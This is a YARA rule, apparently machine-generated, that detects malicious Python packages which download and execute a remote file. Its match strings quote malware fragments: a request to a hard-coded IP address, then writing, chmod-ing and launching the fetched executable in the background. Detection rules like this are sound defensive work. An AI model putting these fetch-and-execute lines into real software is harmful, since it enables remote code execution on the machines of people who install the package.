rule Malicious_Python_Package_Remote_Execution {
    meta:
        author = "RuleLLM"
        description = "Detects malicious Python packages that download and execute remote executables"
        confidence = 90
        severity = 95
    strings:
        $s1 = "req = requests.get('http://35.235.126.33/all.txt')" ascii wide
        $s2 = "with open(executable, 'wb') as f:" ascii wide
        $s3 = "os.system(f'chmod +x {executable}')" ascii wide
        $s4 = "os.system(f'./{executable} &')" ascii wide
        $s5 = "os.system(f'start /B {executable}')" ascii wide
    condition:
        any of ($s1, $s2) and any of ($s3, $s4, $s5)
}